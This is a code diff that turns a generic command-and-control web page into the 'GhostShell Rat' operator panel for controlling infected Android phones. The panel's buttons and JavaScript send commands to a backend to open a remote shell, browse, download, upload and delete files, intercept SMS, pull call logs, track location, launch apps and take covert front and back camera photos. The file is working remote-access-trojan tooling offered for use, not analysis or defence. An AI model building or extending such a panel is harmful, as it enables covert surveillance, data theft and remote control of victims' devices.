@@ -3,64 +3,255 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Web Panel</title>
+    <title>GhostShell Rat</title>
     <style>
-        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; }
-        .header { border-bottom: 1px solid #30363d; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
-        .status { font-weight: bold; }
-        .offline { color: #f85149; } .online { color: #3fb950; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; }
-        button { background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 10px; cursor: pointer; border-radius: 6px; font-weight: bold; }
-        button:hover { background-color: #30363d; border-color: #8b949e; }
-        .terminal { background-color: #010409; border: 1px solid #30363d; height: 350px; overflow-y: scroll; padding: 10px; border-radius: 6px; color: #e6edf3; }
-        .input-group { display: flex; gap: 10px; margin-top: 10px; }
-        input { flex: 1; background: #010409; border: 1px solid #30363d; color: #c9d1d9; padding: 10px; border-radius: 6px; outline: none; }
-        input:focus { border-color: #58a6ff; }
+        :root { --neon-green: #0f0; --dark-bg: #050505; --panel-bg: #111; }
+        body { background-color: var(--dark-bg); color: var(--neon-green); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 0; overflow-x: hidden; }
+        
+        /* Boot Screen */
+        #boot-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity 0.5s ease; }
+        .loading-bar-container { width: 300px; height: 20px; border: 2px solid var(--neon-green); margin-top: 20px; box-shadow: 0 0 10px var(--neon-green); }
+        #loading-bar { width: 0%; height: 100%; background: var(--neon-green); transition: width 0.1s; }
+        
+        /* Main Layout */
+        .container { max-width: 1200px; margin: 20px auto; padding: 20px; display: none; }
+        .header { border-bottom: 2px solid var(--neon-green); padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; text-shadow: 0 0 5px var(--neon-green); }
+        
+        /* Device Info Panel */
+        .device-panel { background: var(--panel-bg); border: 1px solid #333; padding: 15px; margin-bottom: 20px; border-radius: 5px; box-shadow: inset 0 0 10px #000; }
+        .device-panel span { color: #fff; }
+        .status-box { font-weight: bold; padding: 5px 10px; border: 1px solid; border-radius: 3px; }
+        .offline { color: red; border-color: red; text-shadow: 0 0 5px red; } 
+        .online { color: var(--neon-green); border-color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green); }
+        
+        /* Dashboard Grid */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        button { background: transparent; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 15px; cursor: pointer; text-transform: uppercase; font-weight: bold; letter-spacing: 1px; transition: 0.3s; box-shadow: 0 0 5px rgba(0,255,0,0.2); }
+        button:hover { background: var(--neon-green); color: black; box-shadow: 0 0 15px var(--neon-green); }
+        .btn-danger { color: #f00; border-color: #f00; }
+        .btn-danger:hover { background: #f00; color: black; box-shadow: 0 0 15px #f00; }
+
+        /* Modals (Popups) */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(3px); }
+        .modal-content { background: var(--panel-bg); border: 2px solid var(--neon-green); width: 80%; max-width: 800px; height: 70vh; display: flex; flex-direction: column; box-shadow: 0 0 20px var(--neon-green); }
+        .modal-header { padding: 10px; border-bottom: 1px solid var(--neon-green); display: flex; justify-content: space-between; background: #002200; }
+        .close-btn { cursor: pointer; color: red; font-weight: bold; font-size: 20px; }
+        .modal-body { flex: 1; padding: 15px; overflow-y: auto; background: #000; color: #ccc; font-size: 14px; }
+        .modal-footer { padding: 10px; border-top: 1px solid #333; display: flex; gap: 10px; background: #0a0a0a; }
+        input[type="text"] { flex: 1; background: #000; border: 1px solid var(--neon-green); color: var(--neon-green); padding: 10px; outline: none; font-family: inherit; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h2>~ C2 PANEL</h2>
-            <div class="status">Agent: <span id="status" class="offline">OFFLINE</span></div>
-        </div>
-        <div class="grid">
-            <button onclick="cmd('deviceinfo')">Device Info</button>
-            <button onclick="cmd('list_app')">List Apps</button>
-            <button onclick="cmd('getsms')">Get SMS</button>
-            <button onclick="cmd('getcalllogs')">Call Logs</button>
-            <button onclick="cmd('get_location')">Location</button>
-            <button onclick="cmd('takefrontpic')">Front Cam</button>
-            <button onclick="cmd('takebackpic')">Back Cam</button>
-        </div>
-        <div class="input-group">
-            <input type="text" id="cmdInput" placeholder="Custom command (e.g. open https://google.com)">
-            <button onclick="sendCustom()">Execute</button>
-        </div>
-        <h3 style="color: #8b949e;">> LOGS</h3>
-        <div class="terminal" id="terminal"></div>
-    </div>
-    <script>
-        const term = document.getElementById('terminal');
-        const stat = document.getElementById('status');
-        const inp = document.getElementById('cmdInput');
 
+    <div id="boot-screen">
+        <h1 style="text-shadow: 0 0 10px #0f0;">INITIATING GHOSTSHELL RAT...</h1>
+        <div class="loading-bar-container"><div id="loading-bar"></div></div>
+        <p id="loading-text">Establishing secure connection...</p>
+    </div>
+
+    <div class="container" id="main-app">
+        <div class="header">
+            <h2>&#9760; GHOSTSHELL RAT</h2>
+            <div id="status" class="status-box offline">SYS_OFFLINE</div>
+        </div>
+
+        <div class="device-panel">
+            <h3>> TARGET_INFO</h3>
+            <p>IP Address: <span id="info-ip">WAITING...</span></p>
+            <p>Device Logs: <span id="info-device">Scanning... (Click Device Info to update)</span></p>
+        </div>
+
+        <h3>> COMMAND_DASHBOARD</h3>
+        <div class="grid">
+            <button onclick="openModal('modal-terminal', 'shell')">Terminal / Shell</button>
+            <button onclick="openModal('modal-filemanager', 'filemanager')">File Manager</button>
+            <button onclick="openModal('modal-apps', 'list_app')">Applications</button>
+            <button onclick="openModal('modal-sms', 'getsms')">SMS Intercept</button>
+            <button onclick="openModal('modal-calls', 'getcalllogs')">Call Logs</button>
+            <button onclick="cmd('get_location')">Track Location</button>
+            <button onclick="toggleFlash()" id="btn-flash">Flash: OFF</button>
+            <button onclick="cmd('takefrontpic')">Snap Front</button>
+            <button onclick="cmd('takebackpic')">Snap Back</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="global-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span id="modal-title">> SYS_WINDOW</span>
+                <span class="close-btn" onclick="closeModal()">[X]</span>
+            </div>
+            <div class="modal-body" id="modal-output">
+                Waiting for target response...
+            </div>
+            <div class="modal-footer" id="modal-inputs">
+                </div>
+        </div>
+    </div>
+
+    <script>
+        // --- Boot Sequence Animation ---
+        let loadProgress = 0;
+        let bootInterval = setInterval(() => {
+            loadProgress += Math.floor(Math.random() * 15) + 5;
+            if (loadProgress >= 100) {
+                loadProgress = 100;
+                clearInterval(bootInterval);
+                document.getElementById('boot-screen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('boot-screen').style.display = 'none';
+                    document.getElementById('main-app').style.display = 'block';
+                }, 500);
+            }
+            document.getElementById('loading-bar').style.width = loadProgress + '%';
+            if (loadProgress > 50) document.getElementById('loading-text').innerText = "Bypassing security protocols...";
+            if (loadProgress > 80) document.getElementById('loading-text').innerText = "Access granted.";
+        }, 300);
+
+        // --- Core Variables ---
+        const modal = document.getElementById('global-modal');
+        const modalTitle = document.getElementById('modal-title');
+        const modalOutput = document.getElementById('modal-output');
+        const modalInputs = document.getElementById('modal-inputs');
+        
+        let currentMode = ""; // Track what popup is open
+        let flashState = false; // False = off, True = on
+        let processedLogsCount = 0; // To track new logs
+
+        // --- Core Functions ---
         function cmd(c) {
             fetch('/api/command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: c}) })
-            .then(r => r.json()).then(d => { if(d.status === 'error') alert(d.message); });
+            .then(r => r.json()).catch(err => console.error(err));
         }
-        function sendCustom() { if(inp.value.trim()) { cmd(inp.value); inp.value = ""; } }
-        inp.addEventListener("keypress", e => { if (e.key === "Enter") sendCustom(); });
 
+        function toggleFlash() {
+            flashState = !flashState;
+            const btn = document.getElementById('btn-flash');
+            if (flashState) {
+                cmd('flashon');
+                btn.innerText = "Flash: ON";
+                btn.style.color = "black";
+                btn.style.background = "var(--neon-green)";
+            } else {
+                cmd('flashoff');
+                btn.innerText = "Flash: OFF";
+                btn.style.color = "var(--neon-green)";
+                btn.style.background = "transparent";
+            }
+        }
+
+        // --- Modal System ---
+        function openModal(type, initCmd) {
+            currentMode = type;
+            modalOutput.innerHTML = `<span style="color:#0f0;">[sys] Initiating ${type}...</span><br>`;
+            modal.style.display = 'flex';
+            
+            // Setup Footer Inputs based on type
+            if (type === 'modal-filemanager') {
+                modalTitle.innerText = "> GHOST_OS / FILE_MANAGER";
+                modalInputs.innerHTML = `
+                    <input type="text" id="fmInput" placeholder="cd <path> | ls | rm <file> | get <file> | upload <file>">
+                    <button onclick="sendFmCmd()">EXEC</button>
+                `;
+                document.getElementById('fmInput').addEventListener('keypress', e => { if (e.key === 'Enter') sendFmCmd(); });
+                cmd('shell'); // Masuk mode shell di backend
+                setTimeout(() => cmd('ls'), 500); // Otomatis ls
+            } 
+            else if (type === 'modal-apps') {
+                modalTitle.innerText = "> TARGET_APPLICATIONS";
+                modalInputs.innerHTML = `
+                    <input type="text" id="appInput" placeholder="run <package.name>">
+                    <button onclick="sendAppCmd()">RUN APP</button>
+                `;
+                cmd('list_app');
+            }
+            else if (type === 'modal-terminal') {
+                modalTitle.innerText = "> ROOT_TERMINAL";
+                modalInputs.innerHTML = `
+                    <input type="text" id="termInput" placeholder="Enter shell command...">
+                    <button onclick="sendTermCmd()">SEND</button>
+                `;
+                document.getElementById('termInput').addEventListener('keypress', e => { if (e.key === 'Enter') sendTermCmd(); });
+                cmd('shell');
+            }
+            else {
+                // Buat SMS / Call logs (Gak butuh input)
+                modalTitle.innerText = `> DATA_INTERCEPT : ${type}`;
+                modalInputs.innerHTML = `<button onclick="cmd('${initCmd}')" style="width:100%">REFRESH DATA</button>`;
+                cmd(initCmd);
+            }
+        }
+
+        function closeModal() {
+            // Kalau lagi di shell/filemanager, kirim exit biar python backend-nya keluar dari mode
+            if (currentMode === 'modal-filemanager' || currentMode === 'modal-terminal') {
+                cmd('exit');
+                setTimeout(() => cmd('exit_shell'), 300);
+            }
+            modal.style.display = 'none';
+            currentMode = "";
+        }
+
+        // --- Input Handlers ---
+        function sendFmCmd() {
+            const inp = document.getElementById('fmInput');
+            if(inp.value.trim() !== "") { 
+                // Fitur Get (Download) via web
+                if(inp.value.startsWith('get ')) {
+                    modalOutput.innerHTML += `<br><span style="color:#0ff;">[DOWNLOADING] Watch your server 'device_downloads' folder...</span>`;
+                }
+                cmd(inp.value); 
+                inp.value = ""; 
+            }
+        }
+        function sendAppCmd() {
+            const inp = document.getElementById('appInput');
+            if(inp.value.trim() !== "") { cmd(`run ${inp.value}`); inp.value = ""; }
+        }
+        function sendTermCmd() {
+            const inp = document.getElementById('termInput');
+            if(inp.value.trim() !== "") { cmd(inp.value); inp.value = ""; }
+        }
+
+        // --- Polling & Data Router ---
         setInterval(() => {
             fetch('/api/status').then(r => r.json()).then(d => {
-                if(d.connected) { stat.textContent = `ONLINE [${d.address[0]}]`; stat.className = 'online'; } 
-                else { stat.textContent = 'OFFLINE'; stat.className = 'offline'; }
-                
-                let scroll = term.scrollHeight - term.clientHeight <= term.scrollTop + 1;
-                term.innerHTML = d.logs.map(l => `<div>${l}</div>`).join('');
-                if(scroll) term.scrollTop = term.scrollHeight;
+                // Update Header Status
+                const stat = document.getElementById('status');
+                if(d.connected) {
+                    stat.textContent = `SYS_ONLINE [${d.address[0]}]`;
+                    stat.className = 'status-box online';
+                    document.getElementById('info-ip').innerText = d.address[0] + ":" + d.address[1];
+                } else {
+                    stat.textContent = 'SYS_OFFLINE';
+                    stat.className = 'status-box offline';
+                    document.getElementById('info-ip').innerText = "WAITING...";
+                }
+
+                // Parse Device Info if available in logs
+                let logs = d.logs;
+                logs.forEach(l => {
+                    if(l.includes("[INFO]")) {
+                        document.getElementById('info-device').innerText = l.split("[INFO]")[1];
+                    }
+                });
+
+                // Route new logs to the active modal
+                if (currentMode !== "" && logs.length > processedLogsCount) {
+                    let newLogs = logs.slice(processedLogsCount);
+                    let logHtml = "";
+                    newLogs.forEach(l => {
+                        // Basic formatting for aesthetics
+                        if (l.includes("[ERROR]")) logHtml += `<div style="color:red;">${l}</div>`;
+                        else if (l.includes("[SMS]") || l.includes("[APPS]") || l.includes("[D]")) logHtml += `<div style="color:yellow;">${l}</div>`;
+                        else logHtml += `<div>${l}</div>`;
+                    });
+                    
+                    let scroll = modalOutput.scrollHeight - modalOutput.clientHeight <= modalOutput.scrollTop + 1;
+                    modalOutput.innerHTML += logHtml;
+                    if(scroll) modalOutput.scrollTop = modalOutput.scrollHeight;
+                }
+                processedLogsCount = logs.length; // Update tracker
             });
         }, 1500);
     </script>
